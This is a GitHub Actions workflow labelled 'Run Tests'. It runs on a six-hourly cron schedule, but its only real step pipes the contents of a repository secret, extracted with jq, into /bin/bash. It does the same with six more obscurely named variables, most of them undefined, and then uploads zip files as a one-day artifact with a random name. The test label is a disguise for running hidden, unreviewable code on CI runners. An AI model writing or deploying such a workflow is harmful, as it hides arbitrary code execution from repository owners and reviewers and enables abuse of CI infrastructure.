name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '50 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  deploy:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Bootstrap
        env:
          he5: ${{ secrets.he5 }}
        run: |
          printf '%s' "$he5" | jq -r .l79821 | /bin/bash
          printf '%s' "$pa250" | jq -r .aro9 | /bin/bash
          echo $sym9726 | jq -r .osqi98 | /bin/bash
          echo $gkas9 | jq -r .ckmfw27111 | /bin/bash
          printf '%s' "$wmf45" | jq -r .qtqh17 | /bin/bash
          printf '%s' "$dq35727" | jq -r .h23 | /bin/bash
          printf '%s' "$dyoes106" | jq -r .ejtx62 | /bin/bash

      - name: Archive artifact
        uses: actions/upload-artifact@v4
        with:
          name: n6soCrOJ
          path: "*.zip"
          retention-days: 1
